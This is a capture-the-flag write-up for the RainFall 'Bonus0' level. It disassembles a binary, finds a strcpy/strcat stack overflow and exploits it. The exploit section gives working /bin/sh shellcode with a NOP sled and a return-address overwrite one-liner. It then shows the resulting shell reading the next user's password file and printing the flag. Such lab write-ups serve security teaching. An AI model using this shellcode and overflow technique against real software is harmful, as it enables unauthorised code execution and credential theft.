# Bonus0

## **Binary Analysis**

In **Bonus0**, I found a binary file. I tried to disassemble the binary file, and the **`main`** function allocates a buffer, passes its address to the **`pp`** function to populate it, and then prints the content of the buffer using **`puts`**.

```nasm
db) disas main
...
0x080485a4 <+0>:	push   %ebp
0x080485a5 <+1>:	mov    %esp,%ebp ; set up the stack frame
0x080485a7 <+3>:	and    $0xfffffff0,%esp
0x080485aa <+6>:	sub    $0x40,%esp ; allocates 64 bytes of space on the stack
0x080485ad <+9>:	lea    0x16(%esp),%eax
0x080485b1 <+13>:	mov    %eax,(%esp)
0x080485b4 <+16>:	call   0x804851e <pp> ; calls the pp function
0x080485b9 <+21>:	lea    0x16(%esp),%eax
0x080485bd <+25>:	mov    %eax,(%esp)
0x080485c0 <+28>:	call   0x80483b0 [puts@plt] ; prints the content of the buffer
...
```

After disassembling, I found that the **`pp`** function reads two inputs into **`buffer1`** and **`buffer2`** by calling **`p`**. It then copies **`buffer1`** into the buffer provided by **`main`** and concatenates **`buffer2`** to it.

```nasm
(gdb) disas pp
...
0x08048523 <+5>:	sub    $0x50,%esp ; allocates 80 bytes for local variables
0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp) ; places the address of a string
0x0804852e <+16>:	lea    -0x30(%ebp),%eax ; calculates the address of local buffer1 (48)
0x08048531 <+19>:	mov    %eax,(%esp) ; places this address as the first argument
0x08048534 <+22>:	call   0x80484b4 <p> ; Calls p(buffer1, "some_string")
0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
0x08048541 <+35>:	lea    -0x1c(%ebp),%eax ; to get another buffer2 (28)
0x08048544 <+38>:	mov    %eax,(%esp)
0x08048547 <+41>:	call   0x80484b4 <p> ; Calls p(buffer2, "some_string")
0x0804854c <+46>:	lea    -0x30(%ebp),%eax ; sets destination to buffer1
0x0804854f <+49>:	mov    %eax,0x4(%esp)
0x08048553 <+53>:	mov    0x8(%ebp),%eax ; retrieves the first argument passed to pp
0x08048556 <+56>:	mov    %eax,(%esp)
0x08048559 <+59>:	call   0x80483a0 [strcpy@plt] ; Copy buffer1 into the buffer passed from main
[...]
0x08048598 <+122>:	call   0x8048390 [strcat@plt] ; Concatenates buffer2 to the buffer from main
```

Upon disassembling the **`p`** function, I found it displays a message (second argument), reads up to 4096 bytes of input from the user into a local buffer, truncates at the newline character, and copies up to 20 bytes into the provided destination buffer.

```nasm
(gdb) disas p
...
0x080484b7 <+3>:	sub    $0x1018,%esp ; allocates 4120 bytes on stack
0x080484bd <+9>:	mov    0xc(%ebp),%eax
0x080484c0 <+12>:	mov    %eax,(%esp)
0x080484c3 <+15>:	call   0x80483b0 [puts@plt] ; prints the second arg passed to p
0x080484c8 <+20>:	movl   $0x1000,0x8(%esp) ; num of bytes to read (4096)
0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax ; num of bytes to read
0x080484d6 <+34>:	mov    %eax,0x4(%esp)
0x080484da <+38>:	movl   $0x0,(%esp)
0x080484e1 <+45>:	call   0x8048380 [read@plt] ; Calls read(0, buffer, 4096)
0x080484e6 <+50>:	movl   $0xa,0x4(%esp) ; sets the newline byte to null
0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
0x080484f4 <+64>:	mov    %eax,(%esp)
0x080484f7 <+67>:	call   0x80483d0 [strchr@plt] ; to find '\n'
0x080484fc <+72>:	movb   $0x0,(%eax) ; replaces the newline character with a null
0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
0x08048505 <+81>:	movl   $0x14,0x8(%esp) ; num of bytes (20)
0x0804850d <+89>:	mov    %eax,0x4(%esp)
0x08048511 <+93>:	mov    0x8(%ebp),%eax
0x08048514 <+96>:	mov    %eax,(%esp)
0x08048517 <+99>:	call   0x80483f0 [strncpy@plt] ; copy with limit of 0x14 (20) bytes
...
```

## **Vulnerability**

We have a vulnerability in **`pp`** due to the use of **`strcpy`** and **`strcat`** without bounds checking, which exposes the program to **Buffer Overflow** potential. While **`p`** uses **`strncpy`** with a 20-byte limit, **`pp`** uses unsafe **`strcpy`** and **`strcat`**.

When:

- arg1 is not null-terminated (first input ≥ 20 characters)
- arg2 is null-terminated (second input < 20 characters)

We can copy 61 chars (40 + 1 + 20) into a buffer of size 42, giving us 19 bytes to overwrite the EIP address.

Using pattern generator, we found that the offset to EIP starts at 9

## **Exploit**

To exploit this vulnerability, we need to overwrite the return address on the stack to redirect the program's execution flow to our injected code (shellcode).

1. **Inject Shellcode into Memory:**
    - Provide a first input that contains our shellcode.
    - The shellcode will be stored in the large buffer (**`buffer[4096]`**) in **`p`**.
2. **Overwrite the Return Address:**
    - Craft the second input to overflow the **`dest`** buffer in **`pp`** and overwrite the saved return address with the address of our shellcode.

We need to find the start address of the large buffer in **`p`** to store the NOP sled and shellcode.

```nasm
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
Breakpoint 1, 0x080484d0 in p ()
(gdb) x/20x $ebp-0x1008
0xbfffe650:	0x00000000	0x00000000	0x00000000	0x00000000
[..]
(gdb)
```

The buffer starts at **`0xbfffe650`**.

To overflow the buffer and overwrite the return address, we need to determine how many characters fill the buffer up to the return address.

```nasm
(gdb) r
Starting program: /home/user/bonus0/bonus0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff710	0xbffff710
ebp            0x42424242	0x42424242
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
[...]
(gdb)
```

**EIP** is set to **`0x42424242`**, which corresponds to **`BBBB`** in ASCII. The value in **EIP** (**`0x42424242`**) shows that we’ve overwritten it after 9 bytes in our second input.

```nasm
[nop][EIP][nop]
|       |   |
|       |   +-- Additional padding (7 bytes)
|       +-- Return address (4 bytes)
+-- Offset (9 bytes)
```

**Let's craft the exploit:**

```nasm
# First input: NOP sled + shellcode
nop_sled = "\x90" * 400
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Second input: padding + return address
padding1 = "\x90" * 9
ret_addr = "\xe0\xe7\xff\xbf"  # 0xbfffe650 + 400 = 0xbfffe7e0
padding2 = "\x90" * 7
```

The exploit:

```bash
(python -c 'print "\x90" * 400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xe0\xe7\xff\xbf" * 7'; cat) | ./bonus0
```

The result:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xe0\xe7\xff\xbf" * 7'; cat) | ./bonus0
 -
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## **Flag**

```bash
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```